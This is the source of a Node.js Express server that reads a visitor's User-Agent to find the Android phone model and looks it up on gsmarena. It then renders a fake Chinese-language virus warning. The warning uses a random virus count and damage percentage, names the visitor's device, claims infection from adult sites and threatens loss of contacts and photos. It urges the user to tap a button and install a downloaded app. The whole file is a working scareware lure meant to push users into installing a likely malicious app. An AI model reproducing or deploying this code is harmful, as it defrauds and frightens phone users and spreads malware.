'use strict';


var express = require('express');
var app = express();
var request = require("request");
var cheerio = require("cheerio");
var path    = require("path");

app.set("view engine" , "ejs");
app.set('views', __dirname + '/views');

app.use(express.static(__dirname + '/public'));
app.get("/" , function(req,res){

  var modelID = (function(uA){
  var build_tag = new RegExp("Build");
  var device = "";

  if(build_tag.test(uA)){
  	var keyword = new RegExp("\;(.)+Build");
  	var check_sentences = keyword.exec(uA).toString().split(";");
  	for(let i of check_sentences){
  		let device_key = new RegExp("Build");
  		if(device_key.test(i)){
  			device = i.replace("Build" , "");
  			device = device.replace("/" , "");
  			device = device.replace("," , "");
  		}
  	}
  }
  return device;
  })(req.get('User-Agent'));
  if(modelID){
    (function(input_model){


      var searchQuery = encodeURIComponent(input_model);

      request({
        url : "https://www.gsmarena.com/res.php3?sSearch=" + searchQuery,
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
        method : "GET"
      } , function(error , _res , body){
        const $ = cheerio.load(body);

        var find_result;

        if(!$("#review-body").find(".no-results").length){
        //  var model = $($($("#review-body")).find("strong")[0]).html();

          var models = $("#review-body").find("strong");
          var totalKeys = Object.keys(models).length;
          var modelArr = [];
          for(let i = 0 ; i<totalKeys ; i++)
            if($(models[i]).html()){
              var tmp = new RegExp("<br>" , "gm");
              modelArr.push($($(models[i]).html().replace(tmp , " ")).text());
            }
          find_result = modelArr[0];
        }

        var N = Math.floor((Math.random() * 20) + 1);
  	    var persent = Math.floor((Math.random() * 100) + 1);

        if(!find_result)
          find_result = input_model;

        var warning_message = "您的系統受到{0}種病毒的嚴重破壞。我們檢測到您的Android手機 : {1}由於近期成人網站的{2}種有害病毒而損壞了{3}％。很快會損壞手機的SIM卡，並會損壞您的聯繫人，照片，數據，應用程序等。\n\n如果您現在不刪除病毒，會對您的手機造成嚴重傷害。以下是您需要做的（一步一步）：\n\n步驟1：點擊按鈕並安裝下載的應用程序\n步驟2：打開應用程序，加快和修復您的瀏覽器！\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t警告！！！\n\n這個Android手機{4}被感染了病毒，瀏覽器嚴重受損。您需要清除病毒並立即進行更正\n\n現在需要刪除和修復。\n\n不要關閉這個窗口\n\n***如果你離開，你將面臨危險***".format(N,find_result,N,persent,find_result);

        var alert_message = "您的Android系統 : {0}受到嚴重損壞，按下確定修補它".format(find_result);

        res.render("index" ,
          {
            title : "安卓系統警告!!",
            alert_mes : alert_message,
            device_model : find_result,
            nVirus : N,
            damagedPersent : persent
          }
        );

      });
    })(modelID);
  }
  else {
    res.sendFile(path.join(__dirname+'/public/notAndroid.html'));
  }



});

String.prototype.format = function(){
	let str = this;
	let i = arguments.length;

	while(i--){
		let re = new RegExp("\\{" + i + "\\}" , "gm");
		str = str.replace(re , arguments[i]);
	};
	return str;
};

app.listen(3000);
console.log("Running Server on Port 3000");
